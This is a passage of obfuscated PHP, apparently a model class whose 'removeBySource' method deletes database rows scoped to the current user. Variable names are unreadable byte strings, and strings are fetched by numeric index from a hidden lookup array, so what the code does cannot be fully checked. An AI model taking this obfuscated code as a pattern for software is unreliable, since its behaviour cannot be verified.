(!$C¯ìñîí’á) { return !1; } $fÑ»ğòñ„ = array($bÔÙÔ—´•Ş[1555] => USER_ID, $bÔÙÔ—´•Ş[477] => $C¯ìñîí’á); return $this->where($fÑ»ğòñ„)->delete(); } protected function removeBySource($dõ‹÷Ïˆ´) { $B¾öøØŞÚÉ =& $_SERVER[›é¼±]; if (is_array($dõ‹÷Ïˆ´)) { $dõ‹÷Ïˆ´ = array($B¾öøØŞÚÉ[7], $dõ‹÷Ïˆ´); } $D™¢‘¶É¨¤ = array($B¾öøØŞÚÉ[1555] => USER_ID, $B¾öøØŞÚÉ[416] => $dõ‹÷Ïˆ´, $B¾öøØŞÚÉ[477] => array($B¾öøØŞÚÉ[1006], 0)); return $this->where($D™¢‘¶É¨¤)->delete(); } }